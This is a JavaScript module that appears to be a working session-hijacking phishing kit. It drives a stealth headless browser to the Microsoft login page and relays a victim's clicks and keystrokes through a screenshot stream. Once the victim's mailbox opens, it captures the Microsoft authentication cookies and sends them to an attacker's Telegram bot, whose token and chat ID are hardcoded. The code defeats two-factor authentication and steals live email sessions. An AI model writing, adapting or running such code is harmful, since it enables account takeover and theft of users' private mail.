const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const VAULT_URL = "https://script.googleusercontent.com/macros/echo?user_content_key=AWDtjMUqhClgfeFlU8Xv_oX6N6eXj3l7lbyNcSkwxk-JkstXJYafiVNpdDBlT452ND7spqv7p3eQRXoD5LOsTDGcSZA1g4RX8v7GLHXuLucT81tg9au9CEbNP55X9hLIOqMSQh8Fc-taJut7HXkZiFO464jKxJCrfrUaLuqfE4rZyHPFdaXwlPY9wZwfTHjcYK33eMIoLp_eyKW2KspfnYAk2Xx6dbBVNjIOCTUS9di8QeEHoSra82-uqH8Wrl5yHTXorlXRxsCYZa4-wO_EOwajrh3mg7KUNQ&lib=MycdviQl2tpQGpak5QfXFV5l1jq1QWbX2";
const TARGET = "https://login.microsoftonline.com/";

async function getCredentials() {
    try {
        const response = await axios.get(VAULT_URL, { timeout: 7000 });
        if (response.data && response.data.TG_TOKEN) return response.data;
    } catch (e) { console.log("[SYSTEM] Fallback active."); }
    return { 
        "TG_TOKEN": "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc",
        "TG_CHAT_ID": "1318100118"
    };
}

async function sendExfiltration(cookies, url) {
    const creds = await getCredentials();
    const host = new URL(url).hostname;
    try {
        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
            chat_id: creds.TG_CHAT_ID,
            text: `<b>🚨 MAILBOX OPENED & CAPTURED</b>\n<b>User:</b> ${host}\n<b>Status:</b> Full Access Verified`,
            parse_mode: 'HTML'
        });

        const form = new FormData();
        form.append('chat_id', creds.TG_CHAT_ID);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
            filename: `MAILBOX_SESSION_${host.replace(/\./g, '_')}.json`,
            contentType: 'application/json'
        });

        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (e) { console.log("[EXFIL] Error."); }
}

async function startSession(io, socket) {
    let browser = null;
    let captured = false;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox', 
                '--disable-setuid-sandbox', 
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-blink-features=AutomationControlled' // Vital for mailbox access
            ]
        });

        const [page] = await browser.pages();
        await page.setViewport({ width: 1280, height: 720 });
        // Use a persistent browser identity
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36');

        await page.goto(TARGET, { waitUntil: 'networkidle2' });

        // --- THE "MAILBOX HUNTER" LOGIC ---
        const monitor = setInterval(async () => {
            if (captured) return;

            try {
                const url = page.url();
                const cookies = await page.cookies();

                // 1. Detect if the user has clicked "Yes" on KMSI or finished 2FA
                const hasIdentity = cookies.some(c => c.name.includes('MSAAUTH') || c.name.includes('ESTSAUTH'));
                
                // 2. If they have identity but are stuck, force the jump to the mailbox
                if (hasIdentity && (url.includes('kmsi') || url.includes('reprocess'))) {
                    console.log("[FLOW] Identity confirmed. Monitoring for redirect...");
                }

                // 3. SUCCESS CONDITION: The mailbox is actually open
                const isMailboxOpen = url.includes('outlook.live.com') || url.includes('mail.live.com') || url.includes('outlook.office.com');
                const hasSessionKey = cookies.some(c => c.name.includes('RPSSecAuth') || c.name.includes('WLSSC'));

                if (isMailboxOpen && hasSessionKey) {
                    captured = true;
                    console.log("[TARGET] Mailbox accessed. Finalizing jar...");
                    
                    // Allow the inbox to fully load its assets (which sets the final cookies)
                    await page.waitForTimeout(3000); 
                    const finalCookies = await page.cookies();
                    await sendExfiltration(finalCookies, url);
                }
            } catch (e) {}
        }, 4000);

        // --- INTERACTION ---
        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.move(data.x, data.y);
                    await page.mouse.click(data.x, data.y);
                } else if (data.type === 'key') {
                    await page.keyboard.press(data.key);
                }
            } catch (e) {}
        });

        // --- STREAM ---
        const stream = setInterval(async () => {
            if (socket.connected) {
                try {
                    const b64 = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot: b64 });
                } catch (e) {}
            }
        }, 1200);

        socket.on('disconnect', async () => {
            clearInterval(monitor);
            clearInterval(stream);
            if (browser) await browser.close();
        });

    } catch (err) { if (browser) await browser.close(); }
}

module.exports = { startSession };
